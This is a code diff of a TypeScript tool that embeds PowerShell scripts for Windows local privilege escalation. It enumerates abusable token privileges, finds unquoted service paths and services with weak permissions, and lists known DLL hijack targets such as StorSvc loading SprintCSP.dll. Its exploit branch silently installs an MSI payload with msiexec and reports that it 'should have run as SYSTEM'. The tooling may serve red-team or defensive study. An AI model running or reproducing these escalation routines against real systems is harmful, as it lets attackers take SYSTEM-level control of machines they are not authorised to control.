@@ -13710,7 +13710,7 @@ async function privilegeAbuse(args: string[], timeout: number): Promise<HookResu
     const script = `
 # Enumerate current privileges and flag abusable ones
 $privOutput = whoami /priv 2>&1
-Write-Output "=== Current Token Privileges ===`n"
+Write-Output "=== Current Token Privileges ==="
 Write-Output $privOutput
 
 $abusablePrivs = @{
@@ -13767,7 +13767,7 @@ $abusablePrivs = @{
 }
 
 Write-Output ""
-Write-Output "=== Abusable Privileges Analysis ===`n"
+Write-Output "=== Abusable Privileges Analysis ==="
 
 $enabled = @()
 $disabled = @()
@@ -14556,7 +14556,7 @@ ${action === "exploit" && payload ? `
 if ($vulnerable) {
     Write-Output ""
     Write-Output "[*] Executing MSI payload: ${payload}"
-    $proc = Start-Process msiexec -ArgumentList "/quiet /qn /i `"${payload}`"" -Wait -PassThru -ErrorAction Stop
+    $proc = Start-Process msiexec -ArgumentList "/quiet /qn /i '${payload}'" -Wait -PassThru -ErrorAction Stop
     Write-Output "[+] MSI executed with exit code: $($proc.ExitCode)"
     Write-Output "[+] Payload should have run as SYSTEM"
 } else {
@@ -14826,7 +14826,7 @@ if (-not $services) {
     exit 0
 }
 
-Write-Output "[+] Found $($services.Count) service(s) with unquoted paths:`n"
+Write-Output "[+] Found $($services.Count) service(s) with unquoted paths:"
 
 foreach ($svc in $services) {
     Write-Output "  Service: $($svc.Name)"
@@ -15389,7 +15389,7 @@ $found = 0
 $searchPaths = @(
     "$env:SystemRoot\\System32\\drivers",
     "$env:ProgramFiles",
-    "\${env:ProgramFiles(x86)}",
+    ([Environment]::GetEnvironmentVariable("ProgramFiles(x86)")),
     "$env:SystemRoot\\Temp",
     "$env:USERPROFILE\\Downloads"
 )
@@ -15737,7 +15737,7 @@ foreach ($svc in $services) {
 if ($vulnerable.Count -eq 0) {
     Write-Output "[-] No services with weak permissions found"
 } else {
-    Write-Output "[+] Found $($vulnerable.Count) vulnerable service(s):`n"
+    Write-Output "[+] Found $($vulnerable.Count) vulnerable service(s):"
     foreach ($v in $vulnerable) {
         Write-Output "  Service:  $($v.Name) ($($v.Display))"
         Write-Output "  State:    $($v.State) | Start: $($v.StartMode) | RunAs: $($v.RunAs)"
@@ -16128,7 +16128,7 @@ async function dllHijack(args: string[], timeout: number): Promise<HookResult> {
   if (action === "enum") {
     const script = `
 # ── Part 1: Writable directories in system PATH ──
-Write-Output "=== Writable PATH Directories ===`n"
+Write-Output "=== Writable PATH Directories ==="
 
 $pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) } | Sort-Object -Unique
 $writablePaths = @()
@@ -16151,7 +16151,7 @@ if ($writablePaths.Count -eq 0) {
 
 # ── Part 2: Known DLL hijack targets ──
 Write-Output ""
-Write-Output "=== Known DLL Hijack Targets ===`n"
+Write-Output "=== Known DLL Hijack Targets ==="
 
 $knownHijacks = @(
     @{ Service = "StorSvc"; DLL = "SprintCSP.dll"; Desc = "Storage Service — loads from PATH, runs as SYSTEM" },
@@ -16196,7 +16196,7 @@ foreach ($h in $knownHijacks) {
 }
 
 # ── Part 3: Service binary directory permissions ──
-Write-Output "=== SYSTEM Services with Writable Binary Directories ===`n"
+Write-Output "=== SYSTEM Services with Writable Binary Directories ==="
 
 $systemServices = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
     $_.StartName -match 'LocalSystem|SYSTEM' -and $_.PathName
